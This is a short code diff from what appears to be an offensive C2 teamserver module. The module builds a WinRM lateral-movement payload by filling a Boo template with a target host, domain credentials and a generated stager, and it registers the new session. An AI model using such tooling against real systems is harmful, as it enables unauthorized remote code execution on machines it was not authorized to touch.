@@ -52,8 +52,8 @@ class STModule(Module):
             stager.options['AsFunction']['Value'] = False
 
             with open('core/teamserver/modules/boo/src/winrm.boo', 'r') as module_src:
-                stage = stager.generate(listener, as_string=True)
-                stage = stage.replace("$", "\\$")
+                guid, psk, stage = stager.generate(listener)
+                ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))
 
                 src = module_src.read()
                 src = src.replace('TARGET', self.options['Host']['Value'])
@@ -61,7 +61,7 @@ class STModule(Module):
                 src = src.replace('DOMAIN', self.options['Domain']['Value'])
                 src = src.replace('PASSWORD', self.options['Password']['Value'])
                 src = src.replace('TRUSTED_HOSTS', str(self.options['AddToTrustedHosts']['Value']).lower())
-                src = src.replace('PAYLOAD', stage)
+                src = src.replace('PAYLOAD', f'`{stage}`')
                 return src
 
         print_bad('Invalid listener selected')
